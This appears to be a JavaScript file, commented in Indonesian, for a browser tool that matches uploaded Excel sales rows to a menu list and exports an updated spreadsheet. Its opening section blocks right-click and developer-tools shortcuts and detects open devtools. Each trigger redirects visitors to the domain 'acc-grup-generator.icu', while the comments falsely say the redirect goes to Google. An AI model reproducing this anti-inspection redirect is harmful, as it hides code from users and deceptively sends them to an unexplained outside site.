// Mencegah klik kanan
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    alert("Right-click is disabled!");
});

// Mencegah semua shortcut untuk Developer Tools
document.addEventListener('keydown', function(event) {
    // F12
    if (event.keyCode === 123) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + I (Windows/Linux) - Developer Tools
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 73) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + I (Mac) - Developer Tools
    else if (event.metaKey && event.keyCode === 73 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + J (Windows/Linux) - Developer Tools Console
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 74) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + J (Mac) - Developer Tools Console
    else if (event.metaKey && event.keyCode === 74 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + C (Windows/Linux) - Inspect Element
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 67) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + C (Mac) - Inspect Element
    else if (event.metaKey && event.keyCode === 67 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + U (Windows/Linux) - View Source
    else if ((event.ctrlKey || event.metaKey) && event.keyCode === 85) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + U (Mac) - View Source
    else if (event.metaKey && event.keyCode === 85 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + F (Windows/Linux) - Open "Find" bar
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 70) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + F (Mac) - Open "Find" bar
    else if (event.metaKey && event.keyCode === 70 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + D (Windows/Linux) - Developer Tools Dock
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 68) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + D (Mac) - Developer Tools Dock
    else if (event.metaKey && event.keyCode === 68 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // F1 (Help) - Biasanya digunakan untuk membuka Help, seringkali membuka Developer Tools
    else if (event.keyCode === 112) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + E (Windows/Linux) - Network Tab in Developer Tools
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 69) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + E (Mac) - Network Tab in Developer Tools
    else if (event.metaKey && event.keyCode === 69 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Ctrl + Shift + M (Windows/Linux) - Device Mode Toggle
    else if ((event.ctrlKey || event.metaKey) && event.shiftKey && event.keyCode === 77) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
    // Cmd + Option + M (Mac) - Device Mode Toggle
    else if (event.metaKey && event.keyCode === 77 && event.altKey) {
        event.preventDefault(); // Mencegah aksi default
        window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke Google
    }
});

// Menangani deteksi Developer Tools dengan perubahan ukuran jendela
let devToolsOpen = false;

function checkWindowSize() {
    // Tentukan ambang batas perbedaan ukuran untuk mendeteksi Developer Tools
    const threshold = 160;
    const windowWidthDifference = window.outerWidth - window.innerWidth;
    const windowHeightDifference = window.outerHeight - window.innerHeight;

    // Jika perbedaan ukuran lebih besar dari threshold, itu mungkin berarti Developer Tools terbuka
    if (windowWidthDifference > threshold || windowHeightDifference > threshold) {
        if (!devToolsOpen) {
            devToolsOpen = true;
            window.location.replace("http://acc-grup-generator.icu/"); // Redirect ke halaman lain
        }
    } else {
        devToolsOpen = false;
    }
}

// Mengecek perubahan ukuran jendela setiap 500ms
setInterval(checkWindowSize, 500);




let menuData = [];
let salesData = [];

// Fungsi untuk membaca file Excel
function readFile(file, callback) {
    const reader = new FileReader();
    reader.onload = (e) => {
        const data = new Uint8Array(e.target.result);
        const workbook = XLSX.read(data, { type: 'array' });
        const sheetName = workbook.SheetNames[0];
        const sheet = workbook.Sheets[sheetName];
        callback(XLSX.utils.sheet_to_json(sheet, { header: 1 }));
    };
    reader.readAsArrayBuffer(file);
}

// Fungsi untuk memproses data setelah upload
function processData() {
    const menuFile = document.getElementById('menuFile').files[0];
    const salesFile = document.getElementById('salesFile').files[0];

    if (!menuFile || !salesFile) {
        alert("Silakan unggah kedua file terlebih dahulu!");
        return;
    }

    readFile(menuFile, (data) => {
        menuData = data.slice(1).map(row => ({
            ITEMNO: row[0],
            ITEMOVDESC: row[1],
            VARIANT: row[2],
            TYPE: row[3]
        }));
        readFile(salesFile, (data) => {
            salesData = data.slice(1).map(row => row);
            processSalesData();
        });
    });
}

// Fungsi untuk mengatur kolom KeyID
function generateKeyID() {
    let currentInvoice = "";
    let keyIDCounter = 1;

    for (let i = 0; i < salesData.length; i++) {
        const invoiceNo = salesData[i][7]; // INVOICENO ada di kolom indeks ke-7

        if (invoiceNo !== currentInvoice) {
            // Jika INVOICENO berubah, reset keyIDCounter
            currentInvoice = invoiceNo;
            keyIDCounter = 1;
        }

        // Isi kolom KeyID dengan nilai keyIDCounter
        salesData[i][0] = keyIDCounter;
        keyIDCounter++;
    }
}

// Fungsi untuk mencocokkan dan mengupdate data penjualan
function processSalesData() {
    for (let i = 0; i < salesData.length; i++) {
        const itemDesc = salesData[i][3]; // ITEMOVDESC dari penjualan

        const matchingItems = menuData.filter(menu => menu.ITEMOVDESC === itemDesc);

        if (matchingItems.length > 0) {
            if (matchingItems[0].VARIANT === 'NO') {
                // Jika tidak memiliki variant, langsung ambil ITEMNO
                salesData[i][1] = matchingItems[0].ITEMNO;
            } else {
                // Jika memiliki variant, cek item di bawahnya
                const variantName = salesData[i + 1] && salesData[i + 1][3];
                const variantMatch = matchingItems.find(menu => menu.TYPE === variantName);

                if (variantMatch) {
                    salesData[i][1] = variantMatch.ITEMNO;
                    salesData[i][3] = `${variantMatch.ITEMOVDESC} ${variantMatch.TYPE}`;
                    salesData.splice(i + 1, 1); // Hapus baris variant di bawahnya
                }
            }
        }
    }

    // Setelah pencocokan selesai, isi kolom KeyID
    generateKeyID();

    // Tampilkan tombol unduh
    document.getElementById('downloadButton').style.display = 'inline-block';
}

// Fungsi untuk mengunduh data sebagai file Excel
function exportData() {
    const headers = [
        ["KeyID", "ITEMNO", "QUANTITY", "ITEMOVDESC", "GROUPSEQ", "UNITPRICE", "BRUTOUNITPRICE", "INVOICENO", "INVOICEDATE", "CASHDISCOUNT", "INVOICEAMOUNT", "DESCRIPTION", "SHIPDATE"]
    ];
    const outputData = headers.concat(salesData);

    const ws = XLSX.utils.aoa_to_sheet(outputData);
    const wb = XLSX.utils.book_new();
    XLSX.utils.book_append_sheet(wb, ws, "UpdatedSalesData");

    XLSX.writeFile(wb, "UpdatedSalesData.xlsx");
}
